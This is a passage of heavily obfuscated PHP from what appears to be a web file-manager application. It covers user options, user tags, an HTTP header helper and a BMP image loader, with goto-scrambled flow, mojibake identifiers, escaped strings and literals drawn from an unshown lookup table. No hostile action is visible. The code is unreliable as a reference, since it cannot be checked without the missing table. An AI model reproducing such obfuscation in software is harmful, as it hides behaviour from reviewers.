(!$E˜¬Á¿²é½ || !$B»“Ë˜à±) { return; } goto C‰ğ‚¤øª; AÕË’Šˆ«: $b‡ŞŒŞí¨Ğ =& $_SERVER[¼]; $dä‰‹ôôĞ— = array($b‡ŞŒŞí¨Ğ[1404] => array($b‡ŞŒŞí¨Ğ[7], $fØò¡ğ³Ğ)); $B»“Ë˜à± = Model($b‡ŞŒŞí¨Ğ[2141])->where($dä‰‹ôôĞ—)->select(); goto fÁÅ–…İ¶œ; AÌÓ“ˆ†: } private function _listAppendMeta(&$A¢ÔÚ¹ö„, $A¥ÒËÄÙ¡) { goto EŒ×Ö‡âóÚ; EŒ×Ö‡âóÚ: $bğº±Ù¯º =& $_SERVER[¼]; $f¤•¦Ë¼¢ = UserJobModel::JOB_KEY; $Dâ±‹…²ò = array($bğº±Ù¯º[2465]); goto AÙåÇÃŞÀÅ; E‘¹Ê»µ¬ğ: foreach ($bšéŒ¥á³ë as &$CäåÀˆË„‡) { $D«»®ìâ† = array(); foreach ($CäåÀˆË„‡ as $FÙŠ§§ìİ©) { if (!in_array($FÙŠ§§ìİ©[$bğº±Ù¯º[89]], $Dâ±‹…²ò)) { $D«»®ìâ†[$FÙŠ§§ìİ©[$bğº±Ù¯º[89]]] = $FÙŠ§§ìİ©[$bğº±Ù¯º[356]]; } } $CäåÀˆË„‡ = $D«»®ìâ†; } $C‚à¤¾  = Model($bğº±Ù¯º[2489]); foreach ($A¢ÔÚ¹ö„ as &$Cî†ÉÑÈ¹‚) { $FÜ‡Şç“Å = array(); if (isset($bšéŒ¥á³ë[$Cî†ÉÑÈ¹‚[$bğº±Ù¯º[1404]]])) { $FÜ‡Şç“Å = $bšéŒ¥á³ë[$Cî†ÉÑÈ¹‚[$bğº±Ù¯º[1404]]]; } $Cî†ÉÑÈ¹‚[$bğº±Ù¯º[2490]] = array(); if (isset($FÜ‡Şç“Å[$f¤•¦Ë¼¢])) { $Cî†ÉÑÈ¹‚[$bğº±Ù¯º[2490]] = $C‚à¤¾ ->getUserJobInfo($FÜ‡Şç“Å[$f¤•¦Ë¼¢]); } } goto añÎ—ìµÀô; AÙåÇÃŞÀÅ: $a¡‚Úä§­ö = array($bğº±Ù¯º[1404] => array($bğº±Ù¯º[7], $A¥ÒËÄÙ¡)); $bšéŒ¥á³ë = Model($bğº±Ù¯º[2462])->where($a¡‚Úä§­ö)->select(); $bšéŒ¥á³ë = array_to_keyvalue_group($bšéŒ¥á³ë, $bğº±Ù¯º[1404]); goto E‘¹Ê»µ¬ğ; añÎ—ìµÀô: } public function userSearch($c Œ“Ü¼©, $cÈŒ¦Œ¸¥ = "\52") { return Model($_SERVER[¼][473])->where($c Œ“Ü¼©)->field($cÈŒ¦Œ¸¥)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\162\x5f\157\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($F­ƒ¼‚êêß) { $B òÈÚâÒ’ =& $_SERVER[¼]; if (!defined($B òÈÚâÒ’[423])) { define($B òÈÚâÒ’[423], 0); } return "\x55\163\x65\x72\x4f\x70\x74\151\x6f\156\137{$F­ƒ¼‚êêß}\x5f" . USER_ID; } protected function filterWhere($CÆ­•Ó¸Ğö) { $E‹å˜ª¬ï =& $_SERVER[¼]; if (!defined($E‹å˜ª¬ï[423])) { define($E‹å˜ª¬ï[423], 0); } $CÆ­•Ó¸Ğö[$E‹å˜ª¬ï[1404]] = USER_ID; return $CÆ­•Ó¸Ğö; } public function cacheRemoveUser($Dä›Åù¿«, $EÃÌ—áÇÀ) { return Cache::remove("\x55\x73\x65\x72\117\x70\x74\151\x6f\x6e\x5f{$Dä›Åù¿«}\x5f" . $EÃÌ—áÇÀ); } protected function optionDefault($fİ…¾ª«‰ = '') { $a‡¬Õ—„©ã =& $_SERVER[¼]; if ($fİ…¾ª«‰ == $a‡¬Õ—„©ã[33]) { return $GLOBALS[$a‡¬Õ—„©ã[6]][$a‡¬Õ—„©ã[2491]]; } if ($fİ…¾ª«‰ == $a‡¬Õ—„©ã[2492]) { return $GLOBALS[$a‡¬Õ—„©ã[6]][$a‡¬Õ—„©ã[2493]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\x65\162\56\x74\141\147\x4c\x69\x73\164"; public $modelType = "\125\x73\145\162\x4f\x70\164\x69\157\156"; public $field = array("\156\141\x6d\145", "\163\164\171\x6c\x65", "\163\157\162\164"); public function listData($BëœñäÚÄÉ = false, $a®ÑØé¦ÑÇ = "\x73\x6f\162\x74", $cã÷í‹¤Â = false) { return parent::listData($BëœñäÚÄÉ, $a®ÑØé¦ÑÇ, $cã÷í‹¤Â); } public function remove($D‹ˆ¢‚æ²¶) { return parent::remove($D‹ˆ¢‚æ²¶); } public function add($Fø›ã…ó”Œ, $b†ôÀ’¸ãÁ = "\x6c\x61\x62\x65\154\55\x67\162\145\171\55\156\157\162\x6d\141\x6c") { $bîøíÖÂàŒ =& $_SERVER[¼]; if ($this->findByName($Fø›ã…ó”Œ)) { return !1; } $bÖ²Â¢å‚Î = array($bîøíÖÂàŒ[383] => $Fø›ã…ó”Œ, $bîøíÖÂàŒ[433] => $b†ôÀ’¸ãÁ, $bîøíÖÂàŒ[2071] => $this->getSort($bîøíÖÂàŒ[243]) + 1); return parent::insert($bÖ²Â¢å‚Î); } public function update($f˜ÔÌ’ÕÎ³, $FÛ– Æ‚ìì) { $b²Á±‘‘·ö =& $_SERVER[¼]; $A©ò£²™Ñ÷ = $this->listData($f˜ÔÌ’ÕÎ³); $C´šñ§£É = $this->findByName($FÛ– Æ‚ìì[$b²Á±‘‘·ö[28]]); if (!$A©ò£²™Ñ÷ || $C´šñ§£É && $C´šñ§£É[$b²Á±‘‘·ö[364]] != $A©ò£²™Ñ÷[$b²Á±‘‘·ö[364]]) { return !1; } return parent::update($f˜ÔÌ’ÕÎ³, $FÛ– Æ‚ìì); } public function moveTop($a´ğà°£—) { $fæ’¦ Šæ =& $_SERVER[¼]; $FŠ¾Ê…­³ø = parent::listData(); $a† ÈÔ°‘ = $this->getSort($fæ’¦ Šæ[242]); foreach ($FŠ¾Ê…­³ø as &$aÍÑ‘©Éáğ) { if ($aÍÑ‘©Éáğ[$fæ’¦ Šæ[364]] == $a´ğà°£—) { $aÍÑ‘©Éáğ[$fæ’¦ Šæ[2088]] = $a† ÈÔ°‘; continue; } $aÍÑ‘©Éáğ[$fæ’¦ Šæ[2088]] += 1; } return parent::resetData($FŠ¾Ê…­³ø); } public function moveBottom($a ñˆ¶šÂ÷) { $BøïµºÛ±® =& $_SERVER[¼]; $a¡¹¾¢â = $this->getSort($BøïµºÛ±®[243]) + 1; return parent::update($a ñˆ¶šÂ÷, array($BøïµºÛ±®[2088] => $a¡¹¾¢â)); } public function resetSort($c´»¯©£Ç) { goto CæÏçóø­‚; eª¥Ç¬«à: return parent::resetData($D‹ô¤”Œ); goto CàÁ„ƒœİÕ; CæÏçóø­‚: $cÓíö’Å„ =& $_SERVER[¼]; $bª†¬‰°¦Ô = array(); $c´»¯©£Ç = is_array($c´»¯©£Ç) ? $c´»¯©£Ç : array(); goto aÏ­Õ ç; aÏ­Õ ç: for ($Cì°à‹“óè = 0; $Cì°à‹“óè < count($c´»¯©£Ç); $Cì°à‹“óè++) { $bª†¬‰°¦Ô[$c´»¯©£Ç[$Cì°à‹“óè] . $cÓíö’Å„[33]] = $Cì°à‹“óè + 1; } $D‹ô¤”Œ = parent::listData(); foreach ($D‹ô¤”Œ as &$D—Îß…›Á») { $bÅÛÖî†• = $bª†¬‰°¦Ô[$D—Îß…›Á»[$cÓíö’Å„[364]]]; $D—Îß…›Á»[$cÓíö’Å„[2088]] = $bÅÛÖî†• ? $bÅÛÖî†• : $D—Îß…›Á»[$cÓíö’Å„[2088]]; } goto eª¥Ç¬«à; CàÁ„ƒœİÕ: } private function getSort($f–ÉˆØ©ÇÍ) { $dá„¤œÅÈæ =& $_SERVER[¼]; $aõƒšÎš™ = parent::listData(); $Eòöñ­³¾‹ = array_to_keyvalue($aõƒšÎš™, $dá„¤œÅÈæ[33], $dá„¤œÅÈæ[2088]); if (!$Eòöñ­³¾‹) { $Eòöñ­³¾‹ = array(0); } $cƒñ•±Ã†´ = $f–ÉˆØ©ÇÍ == $dá„¤œÅÈæ[243] ? max($Eòöñ­³¾‹) : min($Eòöñ­³¾‹); return intval($cƒñ•±Ã†´); } } goto eâõšÉ¼ªÇ; Aì½Î¨á±Ñ: class HttpHeader { public static $_headers = array("\x48\157\x73\164" => "\110\x54\x54\120\137\x48\x4f\x53\x54", "\x55\163\x65\162\55\x41\147\x65\x6e\164" => "\110\124\x54\x50\137\125\123\105\x52\137\101\107\105\116\x54", "\x43\157\x6e\164\x65\x6e\164\x2d\124\x79\x70\145" => "\110\x54\x54\x50\x5f\x43\x4f\116\x54\x45\116\124\137\124\131\x50\105", "\x43\x6f\x6e\164\145\x6e\x74\55\x4c\145\156\147\x74\x68" => "\110\x54\x54\120\137\103\x4f\x4e\124\105\116\x54\x5f\114\x45\116\107\x54\110", "\x44\x65\x70\x74\x68" => "\110\x54\124\x50\x5f\x44\105\x50\x54\x48", "\105\x78\x70\145\x63\x74" => "\110\124\124\120\x5f\x45\130\x50\x45\x43\x54", "\111\146\x2d\x4e\157\x6e\145\55\x4d\x61\164\x63\x68" => "\110\124\124\x50\x5f\x49\x46\x5f\116\117\116\x45\137\115\x41\x54\x43\x48", "\111\x66\55\115\141\x74\143\x68" => "\x48\x54\124\120\137\111\x46\137\x4d\x41\x54\x43\x48", "\111\146\x2d\x52\x61\156\147\x65" => "\110\124\x54\120\x5f\x49\x46\x5f\x52\101\116\x47\x45", "\114\x61\x73\x74\x2d\x4d\157\144\151\x66\151\145\x64" => "\110\x54\124\120\x5f\x4c\101\123\x54\137\115\x4f\x44\x49\x46\x49\x45\x44", "\111\146\x2d\115\x6f\144\x69\x66\151\145\144\55\x53\x69\156\143\145" => "\x48\124\124\120\137\x49\x46\137\115\x4f\x44\x49\x46\111\105\104\x5f\123\111\x4e\x43\x45", "\x49\146\55\x55\x6e\x6d\157\144\x69\146\x69\x65\x64\x2d\123\151\156\x63\145" => "\110\124\124\120\137\x49\x46\137\125\x4e\115\117\104\111\106\x49\x45\x44\137\x53\111\x4e\103\105", "\x52\141\156\x67\145" => "\110\124\124\x50\x5f\x52\101\x4e\107\x45", "\124\x69\155\x65\x6f\x75\164" => "\110\x54\124\x50\x5f\x54\111\x4d\x45\x4f\x55\x54", "\x49\146" => "\110\124\124\120\137\111\106", "\x4c\157\143\153\x2d\124\157\x6b\145\x6e" => "\110\x54\124\x50\137\x4c\117\103\113\x5f\124\x4f\113\105\x4e", "\x4f\166\145\162\x77\x72\x69\164\x65" => "\x48\124\x54\120\x5f\117\126\105\x52\x57\122\111\x54\105", "\104\x65\x73\164\x69\x6e\141\x74\x69\157\x6e" => "\110\124\x54\120\137\104\x45\x53\124\x49\x4e\x41\124\111\117\116", "\x52\x65\161\165\145\163\x74\55\111\144" => "\x52\x45\121\x55\105\123\x54\x5f\x49\x44", "\x52\145\161\x75\x65\x73\164\55\102\157\x64\x79\x2d\106\x69\x6c\x65" => "\122\x45\x51\x55\105\123\124\137\x42\x4f\x44\x59\137\x46\x49\x4c\x45", "\122\x65\x64\151\x72\x65\x63\x74\55\x53\164\141\x74\x75\163" => "\122\105\x44\111\x52\x45\x43\124\137\123\x54\x41\x54\125\123"); public static function init() { static $e–è¨Ô†‚® = false; if ($e–è¨Ô†‚®) { return; } foreach ($_SERVER as $D¿÷¾èÅßƒ => $D‹âäæÒÌ·) { $D¿÷¾èÅßƒ = strtoupper($D¿÷¾èÅßƒ); if (!array_key_exists($D¿÷¾èÅßƒ, $_SERVER)) { continue; } $_SERVER[$D¿÷¾èÅßƒ] = $D‹âäæÒÌ·; } foreach (self::$_headers as $D¿÷¾èÅßƒ => $d†²’ÁïŠ) { if (!array_key_exists($D¿÷¾èÅßƒ, $_SERVER)) { continue; } $_SERVER[$D¿÷¾èÅßƒ] = $_SERVER[$d†²’ÁïŠ]; $_SERVER[strtoupper($D¿÷¾èÅßƒ)] = $_SERVER[$d†²’ÁïŠ]; } } public static function get($DÖ®½ª„¹¡) { self::init(); return $_SERVER[$DÖ®½ª„¹¡] ? $_SERVER[$DÖ®½ª„¹¡] : $_SERVER[$_SERVER[¼][1792] . strtoupper($DÖ®½ª„¹¡)]; } public static function method() { return strtoupper(self::get($_SERVER[¼][151])); } public static function length() { $DÇÄÄÏÍ¨Ô =& $_SERVER[¼]; $CØ¹å³ÕÆß = self::get($DÇÄÄÏÍ¨Ô[1793]); if (!$CØ¹å³ÕÆß) { $CØ¹å³ÕÆß = self::get($DÇÄÄÏÍ¨Ô[1131]); } return $CØ¹å³ÕÆß; } public static function range() { $f˜‡áŞÁ =& $_SERVER[¼]; $b¯ŞÇ¢ĞŸ‚ = self::get($f˜‡áŞÁ[195]); if (!$b¯ŞÇ¢ĞŸ‚) { return !1; } if (!preg_match($f˜‡áŞÁ[1794], $b¯ŞÇ¢ĞŸ‚, $eÈ¾·ÅÍˆ§)) { return !1; } if ($eÈ¾·ÅÍˆ§[1] === $f˜‡áŞÁ[33] && $eÈ¾·ÅÍˆ§[2] === $f˜‡áŞÁ[33]) { return !1; } return array($eÈ¾·ÅÍˆ§[1] !== $f˜‡áŞÁ[33] ? $eÈ¾·ÅÍˆ§[1] : null, $eÈ¾·ÅÍˆ§[2] !== $f˜‡áŞÁ[33] ? $eÈ¾·ÅÍˆ§[2] : null); } public static $statusCode = array("\x31\60\60" => "\x43\x6f\x6e\x74\151\x6e\x75\x65", "\x31\60\x31" => "\123\167\x69\164\x63\150\151\156\x67\40\120\x72\157\164\x6f\x63\157\154", "\61\60\62" => "\x50\162\x6f\x63\145\163\163\x69\x6e\147", "\61\x30\x33" => "\x45\141\x72\154\171\x20\110\x69\x6e\x74\163", "\62\x30\60" => "\x4f\113", "\62\x30\61" => "\103\x72\x65\141\164\x65\x64", "\x32\60\x32" => "\x41\143\x63\145\x70\x74\x65\144", "\62\60\x33" => "\x4e\157\x6e\55\x41\165\164\150\157\x72\151\x74\x61\164\x69\x76\x65\40\111\x6e\x66\x6f\162\155\x61\x74\x69\x6f\x6e", "\x32\60\64" => "\116\157\40\x43\157\x6e\164\145\156\x74", "\x32\60\65" => "\122\145\163\145\164\x20\103\x6f\156\x74\x65\156\164", "\x32\60\x36" => "\120\141\x72\164\x69\x61\154\40\103\x6f\x6e\x74\x65\x6e\x74", "\x32\x30\x37" => "\x4d\165\x6c\164\151\55\x53\x74\141\x74\x75\163", "\x33\60\x30" => "\x4d\165\154\164\x69\160\154\x65\x20\x43\150\x6f\x69\143\145\x73", "\63\x30\x31" => "\x4d\157\166\145\x64\x20\120\x65\162\x6d\141\156\x65\156\164\x6c\x79", "\63\60\x32" => "\x46\157\x75\x6e\144", "\63\60\63" => "\x53\x65\x65\40\117\164\150\x65\x72", "\63\x30\x34" => "\116\157\x74\x20\115\x6f\x64\151\146\x69\145\x64", "\x33\x30\x35" => "\x55\163\x65\x20\120\x72\x6f\x78\x79", "\63\60\67" => "\124\145\155\160\x6f\162\141\x72\171\x20\x52\x65\144\x69\x72\x65\x63\164", "\x33\60\70" => "\120\x65\x72\155\141\x6e\145\156\x74\40\122\145\144\151\x72\145\143\x74", "\x34\x30\x30" => "\102\x61\144\40\122\x65\161\165\145\163\x74", "\64\60\61" => "\125\156\141\165\164\150\157\x72\151\x7a\x65\144", "\x34\60\x32" => "\x50\141\171\155\145\156\164\40\122\145\x71\x75\x69\162\x65\x64", "\x34\60\x33" => "\106\157\x72\142\151\x64\144\x65\156", "\x34\60\64" => "\116\x6f\x74\x20\106\157\165\x6e\144", "\64\x30\65" => "\x4d\145\164\x68\157\x64\x20\x4e\x6f\164\x20\101\154\x6c\x6f\x77\145\144", "\64\x30\x36" => "\x4e\157\164\40\x41\x63\143\145\160\x74\141\142\154\145", "\64\60\67" => "\120\x72\157\x78\171\40\101\165\164\150\145\156\164\151\x63\x61\x74\151\157\156\x20\122\145\x71\x75\x69\162\x65\x64", "\x34\60\70" => "\x52\145\161\x75\145\x73\x74\x20\x54\151\x6d\x65\x6f\165\x74", "\x34\x30\x39" => "\103\x6f\156\146\154\151\x63\164", "\64\61\60" => "\x47\157\x6e\x65", "\64\61\61" => "\114\145\x6e\x67\164\x68\40\122\x65\x71\165\x69\x72\x65\144", "\64\x31\x32" => "\120\162\145\143\x6f\x6e\x64\x69\164\151\157\156\40\x46\141\x69\154\145\144", "\x34\61\x33" => "\x52\x65\161\165\x65\163\164\x20\x45\156\x74\151\164\171\x20\x54\157\157\40\x4c\141\162\147\145", "\x34\x31\64" => "\122\x65\161\x75\x65\x73\164\40\x55\122\x49\40\x54\157\x6f\40\114\x61\162\x67\x65", "\64\61\65" => "\125\x6e\163\165\x70\160\157\x72\x74\x65\144\x20\x4d\x65\x64\151\x61\40\x54\171\x70\x65", "\64\61\66" => "\x52\145\x71\x75\145\163\164\x65\144\x20\122\141\156\147\x65\x20\x4e\157\164\40\x53\x61\164\x69\x73\x66\x69\x61\x62\x6c\145", "\64\61\x37" => "\x45\170\160\x65\x63\x74\141\x74\151\157\x6e\40\106\141\x69\154\145\144", "\64\x32\62" => "\x55\156\x70\x72\x6f\x63\x65\x73\x73\x61\142\x6c\x65\x20\105\x6e\164\151\164\x79", "\x34\x32\x33" => "\x4c\x6f\x63\x6b\145\144", "\64\x32\64" => "\x46\x61\x69\154\x65\x64\40\x44\x65\x70\x65\156\x64\x65\x6e\x63\171", "\64\x32\x35" => "\x55\x6e\x6f\x72\144\x65\x72\145\x64\40\103\x6f\x6c\154\x65\143\x74\x69\x6f\x6e", "\64\x32\x36" => "\125\x70\147\x72\x61\x64\145\x20\122\145\x71\x75\x69\162\145\144", "\64\62\70" => "\x50\162\145\x63\157\156\144\151\x74\x69\x6f\x6e\40\x52\x65\161\165\x69\162\145\144", "\x34\62\x39" => "\124\157\x6f\40\115\141\x6e\171\40\x52\x65\161\165\145\163\164\x73", "\64\63\x31" => "\x52\x65\161\x75\x65\163\164\x20\110\x65\x61\x64\145\162\x20\x46\151\x65\154\x64\x73\40\x54\157\x6f\40\114\141\162\147\145", "\64\64\64" => "\116\157\40\x52\145\x73\160\157\x6e\x73\x65", "\x34\65\x30" => "\102\x6c\x6f\143\x6b\145\144\x20\142\171\x20\x57\151\x6e\x64\157\x77\163\x20\120\141\x72\145\156\164\141\154\x20\103\157\x6e\x74\x72\157\154\163", "\64\x35\61" => "\125\x6e\141\166\141\x69\154\141\142\x6c\145\x20\x46\x6f\x72\40\114\145\x67\141\x6c\x20\122\x65\x61\163\157\x6e\163", "\x34\x39\64" => "\x52\145\161\x75\x65\163\164\x20\110\145\141\x64\x65\162\x20\x54\157\x6f\x20\x4c\x61\x72\147\145", "\x35\x30\x30" => "\x49\x6e\164\x65\162\156\141\x6c\x20\x53\x65\162\x76\145\162\40\x45\x72\x72\x6f\162", "\x35\x30\61" => "\116\157\164\40\111\x6d\x70\x6c\145\155\x65\x6e\x74\145\x64", "\x35\60\62" => "\102\141\144\40\107\141\x74\145\167\141\x79", "\65\x30\x33" => "\x53\x65\x72\166\x69\143\x65\40\125\x6e\141\166\141\x69\154\x61\x62\x6c\145", "\x35\60\64" => "\107\x61\164\x65\x77\141\171\40\124\151\x6d\145\157\165\x74", "\x35\60\65" => "\110\x54\124\120\40\x56\145\x72\163\151\157\x6e\40\x6e\x6f\164\40\163\x75\x70\x70\157\x72\164\145\144", "\x35\60\x37" => "\x49\x6e\x73\x75\x66\146\151\x63\x69\145\x6e\x74\40\123\164\x6f\x72\141\147\145"); public static function code($d¤ÇÖšÖˆ÷) { $A’ƒ²ÄÓ”— =& $_SERVER[¼]; $d¤ÇÖšÖˆ÷ = $d¤ÇÖšÖˆ÷ . $A’ƒ²ÄÓ”—[33]; $c•×«ÀÜ‡ = self::$statusCode[$d¤ÇÖšÖˆ÷]; $c•×«ÀÜ‡ = $c•×«ÀÜ‡ ? "\x48\124\x54\120\57\61\56\61\x20{$d¤ÇÖšÖˆ÷}\40" . $c•×«ÀÜ‡ : $A’ƒ²ÄÓ”—[33]; return $c•×«ÀÜ‡; } } class ImageGdBMP { public static function load($cæÆà½•Ÿç) { $b®«½ë¥íÆ = fopen($cæÆà½•Ÿç, $_SERVER[¼][1483]); if ($b®«½ë¥íÆ === !1) { return !1; } $Bã÷¢¡ğ = self::loadFromStream($b®«½ë¥íÆ); fclose($b®«½ë¥íÆ); return $Bã÷¢¡ğ; } public static function loadFromStream($e¼‘‹ÀÈ–„) { $e“ÍÓÜÓÌ° =& $_SERVER[¼]; $Cè‘—–æÀ = fread($e¼‘‹ÀÈ–„, 14); if ($Cè‘—–æÀ === !1) { return !1; } if ($Cè‘—–æÀ[0] != $e“ÍÓÜÓÌ°[1795] || $Cè‘—–æÀ[1] != $e“ÍÓÜÓÌ°[1796]) { return !1; } $DÈ™ÆŠŠ¶ = unpack($e“ÍÓÜÓÌ°[1797] . $e“ÍÓÜÓÌ°[1798] . $e“ÍÓÜÓÌ°[1799] . $e“ÍÓÜÓÌ°[1800] . $e“ÍÓÜÓÌ°[1801], $Cè‘—–æÀ); return self::loadFromStreamAndFileHeader($e¼‘‹ÀÈ–„, $DÈ™ÆŠŠ¶); } public static function loadFromStreamAndFileHeader($cáøªêº‚, array $c«±‘Î³ÃÛ) { goto Bö·ó™œÔ; fšä”®ƒ¶Ì: if ($fºˆ”×±†™ === !1) { return !1; } list(, $D¬¨ÀÓ®) = unpack($B‰¬º†‚¦İ[1802], $fºˆ”×±†™); if ($D¬¨ÀÓ® == 12) { goto DàšÀóØÂê; d±¡ÊöèÁ¸: $D®£‹ÖŒ­Ö = 255; goto B§‹¦µâ¡×; DàšÀóØÂê: $fºˆ”×±†™ = fread($cáøªêº‚, $D¬¨ÀÓ® - 4); if ($fºˆ”×±†™ === !1) { return !1; } extract(unpack($B‰¬º†‚¦İ[1803] . $B‰¬º†‚¦İ[1804] . $B‰¬º†‚¦İ[1805] . $B‰¬º†‚¦İ[1806], $fºˆ”×±†™)); goto f‚ÓËïé¿ï; f‚ÓËïé¿ï: $eß‚ÃŒä = $Fø­óÃ”„½ = $bßºÓñš = $fåĞ…À  = 0; $d¡Ô¯Î‰¡Ì = 16711680; $b¨Ú²ÆÍ  = 65280; goto d±¡ÊöèÁ¸; B§‹¦µâ¡×: } else { if (124 < $D¬¨ÀÓ® || $D¬¨ÀÓ® < 40) { return !1; } else { goto CëÄæùßÄœ; dŠÔÍ¸òô: if ($EœÒ†ñŠàŠ & 2147483648) { $EœÒ†ñŠàŠ = -(~$EœÒ†ñŠàŠ & 4294967295) - 1; } if ($aß°İØØ¿ & 2147483648) { $aß°İØØ¿ = -(~$aß°İØØ¿ & 4294967295) - 1; } if ($E±‚¥¿ÙÌ & 2147483648) { $E±‚¥¿ÙÌ = -(~$E±‚¥¿ÙÌ & 4294967295) - 1; } goto E«Øìäˆ‹³; CëÄæùßÄœ: $fºˆ”×±†™ = fread($cáøªêº‚, 36); if ($fºˆ”×±†™ === !1) { return !1; } extract(unpack($B‰¬º†‚¦İ[1807] . $B‰¬º†‚¦İ[1808] . $B‰¬º†‚¦İ[1805] . $B‰¬º†‚¦İ[1809] . $B‰¬º†‚¦İ[1810] . $B‰¬º†‚¦İ[1811] . $B‰¬º†‚¦İ[1812] . $B‰¬º†‚¦İ[1813] . $B‰¬º†‚¦İ[1814] . $B‰¬º†‚¦İ[1815], $fºˆ”×±†™)); goto dŠÔÍ¸òô; E«Øìäˆ‹³: if ($c¿¢Ÿ•ïÎ & 2147483648) { $c¿¢Ÿ•ïÎ = -(~$c¿¢Ÿ•ïÎ & 4294967295) - 1; } if ($c«±‘Î³ÃÛ[$B‰¬º†‚¦İ[516]] != 0) { $eÅİÄ½ÃÓ¢ = $eƒ‡Ó ï»¿ == 1 || $eƒ‡Ó ï»¿ == 4 || $eƒ‡Ó ï»¿ == 8 ? ($eß‚ÃŒä ? $eß‚ÃŒä : pow(2, $eƒ‡Ó ï»¿)) << 2 : 0; $D»‰×ÖÃ›‘ = $D›ƒ¨°¦µ ? $D›ƒ¨°¦µ : ($EœÒ†ñŠàŠ * $eƒ‡Ó ï»¿ + 31 >> 3 & ~3) * abs($aß°İØØ¿); $B¥âèÂÓ· = $c«±‘Î³ÃÛ[$B‰¬º†‚¦İ[516]] - $D»‰×ÖÃ›‘ - $eÅİÄ½ÃÓ¢ - 14; if ($D¬¨ÀÓ® < $B¥âèÂÓ· && 40 <= $D¬¨ÀÓ® && $D¬¨ÀÓ® <= 124) { $D¬¨ÀÓ® = $B¥âèÂÓ·; } } if ($D¬¨ÀÓ® - 40 > 0) { $fºˆ”×±†™ = fread($cáøªêº‚, $D¬¨ÀÓ® - 40); if ($fºˆ”×±†™ === !1) { return !1; } extract(unpack($B‰¬º†‚¦İ[1816] . $B‰¬º†‚¦İ[1817] . $B‰¬º†‚¦İ[1818] . $B‰¬º†‚¦İ[1819], $fºˆ”×±†™ . str_repeat($B‰¬º†‚¦İ[1820], 120))); } else { $bßºÓñš = $d¡Ô¯Î‰¡Ì = $b¨Ú²ÆÍ  = $D®£‹ÖŒ­Ö = 0; } goto fïóïİ¬ËË; fïóïİ¬ËË: if (($eƒ‡Ó ï»¿ == 16 || $eƒ‡Ó ï»¿ == 24 || $eƒ‡Ó ï»¿ == 32) && $fåĞ…À  == 0 && $d¡Ô¯Î‰¡Ì == 0 && $b¨Ú²ÆÍ  == 0 && $D®£‹ÖŒ­Ö == 0) { switch ($eƒ‡Ó ï»¿) { case 16: $d¡Ô¯Î‰¡Ì = 31744; $b¨Ú²ÆÍ  = 992; $D®£‹ÖŒ­Ö = 31; break; case 24: case 32: $d¡Ô¯Î‰¡Ì = 16711680; $b¨Ú²ÆÍ  = 65280; $D®£‹ÖŒ­Ö = 255; break; } } goto CäæãÅ©; CäæãÅ©: } } goto A¢Õ¾ÖÌ‘; Bö·ó™œÔ: $B‰¬º†‚¦İ =& $_SERVER[¼]; if ($c«±‘Î³ÃÛ[$B‰¬º†‚¦İ[385]] != 19778) { return !1; } $fºˆ”×±†™ = fread($cáøªêº‚, 4); goto fšä”®ƒ¶Ì; d†Û†ÄË» : if ($eƒ‡Ó ï»¿ == 1 || $eƒ‡Ó ï»¿ == 4 || $eƒ‡Ó ï»¿ == 8) { goto fÏ‰‚³Ö°; fÏ‰‚³Ö°: $fÉÖàƒÆÏ¡ = imagecreate($EœÒ†ñŠàŠ, $D†ºÜÀ×£); $f‹ÎÜ‡ŞÖ = $D¬¨ÀÓ® == 12 ? 3 : 4; $cÏ¸ÌöŒä = $eß‚ÃŒä ? $eß‚ÃŒä : pow(2, $eƒ‡Ó ï»¿); goto DÏ¼ËÍ¶í; eË¨‡½»ğÃ: $B¼•õÓ“ = (1 << $eƒ‡Ó ï»¿) - 1 << $E¾›Ê‹“ˆ; if ($fåĞ…À  == 1 || $fåĞ…À  == 2) { $BÈäïôªğ = 0; $FŸ¨ÏÄšøÕ = $eƒ‡Ó ï»¿ >> 2 & 1; for (;;) { if ($BÈäïôªğ < -1 || $BÈäïôªğ > $EœÒ†ñŠàŠ || $dà©Êºá°˜ < -1 || $dà©Êºá°˜ > $aß°İØØ¿) { imagedestroy($fÉÖàƒÆÏ¡); return !1; } $fºˆ”×±†™ = fread($cáøªêº‚, 1); if ($fºˆ”×±†™ === !1) { imagedestroy($fÉÖàƒÆÏ¡); return !1; } switch ($fºˆ”×±†™) { case $B‰¬º†‚¦İ[1820]: $fºˆ”×±†™ = fread($cáøªêº‚, 1); if ($fºˆ”×±†™ === !1) { imagedestroy($fÉÖàƒÆÏ¡); return !1; } switch ($fºˆ”×±†™) { case $B‰¬º†‚¦İ[1820]: $dà©Êºá°˜ += $A™¥®ƒ»Ää; $BÈäïôªğ = 0; break; case $B‰¬º†‚¦İ[1822]: $dà©Êºá°˜ = 0; $BÈäïôªğ = 0; break 3; case $B‰¬º†‚¦İ[1823]: $fºˆ”×±†™ = fread($cáøªêº‚, 2); if ($fºˆ”×±†™ === !1) { imagedestroy($fÉÖàƒÆÏ¡); return !1; } list(, $f…Å‚ùîŠ‘, $A„ó¥©Şö·) = unpack($B‰¬º†‚¦İ[1824], $fºˆ”×±†™); $BÈäïôªğ += $f…Å‚ùîŠ‘; $dà©Êºá°˜ += $A„ó¥©Şö· * $A™¥®ƒ»Ää; break; default: list(, $còâ³Áºõ) = unpack($B‰¬º†‚¦İ[1825], $fºˆ”×±†™); $cÌ™”Øİê¦ = ($còâ³Áºõ >> $FŸ¨ÏÄšøÕ) + ($còâ³Áºõ & $FŸ¨ÏÄšøÕ); $fºˆ”×±†™ = fread($cáøªêº‚, $cÌ™”Øİê¦ + 1 & ~1); if ($fºˆ”×±†™ === !1) { imagedestroy($fÉÖàƒÆÏ¡); return !1; } for ($DöíÙÍº‘ö = 0, $Dìë³ˆë™µ = 0; $DöíÙÍº‘ö < $còâ³Áºõ; ++$DöíÙÍº‘ö, ++$BÈäïôªğ, $Dìë³ˆë™µ += $eƒ‡Ó ï»¿) { list(, $Dµ¿÷õ­ä¬) = unpack($B‰¬º†‚¦İ[1825], $fºˆ”×±†™[$Dìë³ˆë™µ >> 3]); $f„ÏÈé¦İ = $Dìë³ˆë™µ & 7; imagesetpixel($fÉÖàƒÆÏ¡, $BÈäïôªğ, $dà©Êºá°˜, $A¾ôˆàîœè[($Dµ¿÷õ­ä¬ & $B¼•õÓ“ >> $f„ÏÈé¦İ) >> $E¾›Ê‹“ˆ - $f„ÏÈé¦İ]); } break; } break; default: $BÑ°Ã›İØÑ = fread($cáøªêº‚, 1); if ($BÑ°Ã›İØÑ === !1) { 